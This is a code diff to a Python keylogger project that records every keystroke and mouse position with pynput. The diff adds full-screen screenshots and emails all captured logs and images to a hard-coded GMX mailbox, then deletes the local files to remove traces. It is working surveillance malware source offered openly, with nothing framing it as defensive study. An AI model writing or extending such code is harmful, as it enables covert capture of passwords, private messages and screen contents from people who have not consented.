@@ -1,6 +1,6 @@
-# This file is part of [key+mouse].
+# This file is part of [key+mouse+scren].
 #
-# [key+mouse] is free software: you can redistribute it and/or modify
+# [key+mouse+scren]] is free software: you can redistribute it and/or modify
 # it under the terms of the GNU General Public License as published by
 # the Free Software Foundation, either version 3 of the License, or
 # (at your option) any later version.
@@ -20,11 +20,12 @@ import datetime
 from pynput.keyboard import Key, Listener as KeyboardListener
 from pynput.mouse import Listener as MouseListener
 import threading
-import time
+from PIL import ImageGrab  # For taking screenshots
 
 # Files for saving keyboard and mouse data
 keyboard_log_file = "keyboard.txt"
 mouse_log_file = "mouse.txt"
+screenshot_file = "screenshot.png"
 
 # Buffer to store keyboard input
 buffer = ""
@@ -57,28 +58,36 @@ def mouse_position(x, y):
     with open(mouse_log_file, "a") as f:
         f.write(f"Current pointer position is: ({x}, {y})\n")
 
-# Function to send email with logged data
+# Function to take a screenshot and save it
+def take_screenshot():
+    screenshot = ImageGrab.grab()
+    screenshot.save(screenshot_file)
+
+# Function to send email with logged data and screenshot
 def send_email():
     try:
+        # Take a screenshot
+        take_screenshot()
+
         # Read the log files
         with open(keyboard_log_file, 'r') as f:
             keyboard_data = f.read()
         with open(mouse_log_file, 'r') as f:
             mouse_data = f.read()
 
-            # GMX email login credentials
+        # GMX email login credentials
         gmx_user = '******'  # Replace with your GMX email
         gmx_password = '*****'  # Replace with your GMX password
 
         # Create email message
         message = EmailMessage()
-        message['Subject'] = 'Keyboard and Mouse Activity Logs'
+        message['Subject'] = 'Keyboard, Mouse Activity Logs, and Screenshot'
         message['From'] = gmx_user
         message['To'] = '*****'  # Replace with your recipient email
         message.set_content(f"Here are the recent logs:\n\nKeyboard:\n{keyboard_data}\n\nMouse:\n{mouse_data}")
 
         # Attach files
-        for file in [keyboard_log_file, mouse_log_file]:
+        for file in [keyboard_log_file, mouse_log_file, screenshot_file]:
             if os.path.exists(file):
                 with open(file, 'rb') as f:
                     file_data = f.read()
@@ -94,9 +103,11 @@ def send_email():
         # Print success message with current time
         print(f"Email sent successfully at {datetime.datetime.now()}")
 
-        # Clean up: Remove log files after sending email
-        os.remove(keyboard_log_file)
-        os.remove(mouse_log_file)
+        # Clean up: Remove all log files and screenshot
+        for file in [keyboard_log_file, mouse_log_file, screenshot_file]:
+            if os.path.exists(file):
+                os.remove(file)
+
     except Exception as e:
         print(f"Error sending email: {e}")
 
